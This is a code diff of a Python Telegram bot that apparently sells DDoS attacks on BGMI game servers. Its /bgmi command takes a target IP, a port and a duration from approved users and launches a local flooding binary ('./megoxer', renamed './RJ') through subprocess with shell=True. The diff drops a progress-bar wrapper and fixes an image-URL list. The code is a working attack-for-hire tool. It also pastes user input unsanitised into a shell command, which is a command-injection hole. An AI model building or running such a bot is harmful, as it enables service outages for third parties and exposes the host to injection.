@@ -1,11 +1,9 @@
 import telebot
 import subprocess
 import datetime
-import time
 import os
 import random
 from keep_alive import keep_alive
-from tqdm import tqdm  # Import tqdm to show a progress bar
 
 # Start the keep_alive function to keep the bot running
 keep_alive()
@@ -71,59 +69,16 @@ def set_approval_expiry_date(user_id, duration, time_unit):
 
 # ------------------ Attack and Response Functions ------------------
 
-# Function to simulate attack and send progress updates to the bot
-def run_attack_with_progress(bot, message, target, port, duration):
-    # Send an initial message to the user
-    progress_message = bot.reply_to(message, "Attack running... Please wait.\nConnection: [0%] Running...")
-
-    total_steps = duration  # Assuming duration is in seconds
-    
-    for i in range(total_steps):
-        # Simulate running the attack (replace with actual attack logic)
-        subprocess.run(f"./megoxer {target} {port} {duration} 900", shell=True)
-        
-        # Calculate the progress percentage
-        progress_percent = int((i + 1) / total_steps * 100)
-        
-        # Create a progress bar string (using █ to create a filled bar)
-        filled_bar = '█' * (progress_percent // 5)  # 1 block for every 5%
-        empty_bar = ' ' * (20 - len(filled_bar))  # Empty blocks
-        progress_bar = f"[{filled_bar}{empty_bar}] {progress_percent}%"
-        
-        # Update the message with the current progress
-        bot.edit_message_text(
-            text=f"🅰🆃🆃🅰🅲🅺.🆁🆄🅽🅽🅸🅽🅶... Please wait.\n\nConnection: {progress_bar} Running...",
-            chat_id=message.chat.id,
-            message_id=progress_message.message_id
-        )
-
-        # Wait for a second to simulate the attack progress
-        time.sleep(1)
-
-    # Once done, send a final message indicating the attack completion
-    bot.edit_message_text(
-        text=f"🅰🆃🆃🅰🅲🅺 🅲🅾🅼🅿🅻🅴🆃🅴🅳.\n\nConnection: [███████████████████████ 100%] Finished.",
-        chat_id=message.chat.id,
-        message_id=progress_message.message_id
-    )
-
-# Example usage in the /bgmi command handler
-
-# Example usage in the /bgmi command handler
-
-import random
-
-# Example list of image URLs (replace with actual image sources or use an API for random images)
 random_image_urls = [
-    "https://www.freepik.com/free-photo/guy-makes-her-feel-like-princess_16180653.htm#fromView=keyword&page=1&position=3&uuid=441df3e9-09c0-4532-bf3b-5b4ca2f7e4b9&query=Hot+Sex"
-    "https://www.freepik.com/free-photo/lovely-couple-bed_16180644.htm#fromView=keyword&page=1&position=14&uuid=bb71c4bd-63c4-4394-9f3b-0a05f611eb93&query=Hot+Sex"
-    "https://www.pexels.com/photo/man-and-woman-kissing-near-pendant-lamp-1321287/"
-    "https://www.pexels.com/photo/man-and-woman-standing-outside-near-bare-tree-2174661/"
-    "https://www.pexels.com/photo/a-couple-holding-hands-on-the-steps-of-a-building-15682769/"
-    "https://www.pexels.com/photo/romantic-hand-holding-in-srinagar-autumn-29602571/"
-    "https://www.pexels.com/photo/couple-hands-with-wristwatches-14841768/"
-    "https://www.pexels.com/photo/photo-of-boy-hugging-his-sister-3807193/"
-    "https://t.me/c/2425220992/676"
+    "https://www.freepik.com/free-photo/guy-makes-her-feel-like-princess_16180653.htm#fromView=keyword&page=1&position=3&uuid=441df3e9-09c0-4532-bf3b-5b4ca2f7e4b9&query=Hot+Sex",
+    "https://www.freepik.com/free-photo/lovely-couple-bed_16180644.htm#fromView=keyword&page=1&position=14&uuid=bb71c4bd-63c4-4394-9f3b-0a05f611eb93&query=Hot+Sex",
+    "https://www.pexels.com/photo/man-and-woman-kissing-near-pendant-lamp-1321287/",
+    "https://www.pexels.com/photo/man-and-woman-standing-outside-near-bare-tree-2174661/",
+    "https://www.pexels.com/photo/a-couple-holding-hands-on-the-steps-of-a-building-15682769/",
+    "https://www.pexels.com/photo/romantic-hand-holding-in-srinagar-autumn-29602571/",
+    "https://www.pexels.com/photo/couple-hands-with-wristwatches-14841768/",
+    "https://www.pexels.com/photo/photo-of-boy-hugging-his-sister-3807193/",
+    "https://t.me/c/2425220992/676",
     "https://t.me/c/2425220992/677"
 ]
 
@@ -219,17 +174,16 @@ def handle_bgmi(message):
             if time > 240:
                 response = "❌ 𝙴𝚛𝚛𝚘𝚛: 𝚘𝚗𝚕𝚢 𝚢𝚘𝚞 𝚌𝚊𝚗 𝚞𝚜𝚎 𝚝𝚘  240 𝚜𝚎𝚌𝚘𝚗𝚍𝚜"
             else:
-                record_command_logs(user_id, '/megoxer', target, port, time)
+                record_command_logs(user_id, '/RJ', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)
-                run_attack_with_progress(bot, message, target, port, time)  # Call the function to run attack with progress
-                response = f" "
+                subprocess.run(f"./RJ {target} {port} {time} 900", shell=True)
+                response = f"🅱🅶🅼🅸 🅺🅸 🅲🅷🆄🅳🅰🆈🅸 🅺🅷🅰🆃🅰🅼. 𝐭𝐚𝐫𝐠𝐞𝐭: {target} 𝐩𝐨𝐫𝐭: {port} 𝐝𝐮𝐫𝐚𝐭𝐨𝐢𝐧: {time}"
             bot.reply_to(message, response)
         else:
             bot.reply_to(message, "𝚎𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /bgmi <𝚝𝚊𝚛𝚐𝚎𝚝> <𝚙𝚎𝚛𝚝> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗>")
     else:
         bot.reply_to(message, "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚘𝚛𝚒𝚣𝚎𝚍 𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝚝𝚘 𝚝𝚑𝚎 𝚘𝚠𝚗𝚎𝚛 @GODxAloneBOY.")
-
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
@@ -277,4 +231,3 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(f"Error: {e}")
-        
